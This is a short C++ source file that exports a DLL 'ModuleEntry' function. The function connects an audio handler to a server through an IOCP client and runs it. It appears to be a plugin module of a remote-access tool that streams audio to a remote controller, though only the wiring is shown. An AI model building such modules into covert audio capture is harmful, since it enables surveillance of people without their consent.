#include "Audio.h"
#include "IOCPClient.h"

extern "C" __declspec(dllexport) void  ModuleEntry(char* szServerAddr, unsigned short uPort, DWORD dwParam){
	CAudio audio;
	CIOCPClient io(szServerAddr, uPort);

	io.BindHandler(&audio);
	io.Run();
	io.UnbindHandler();
}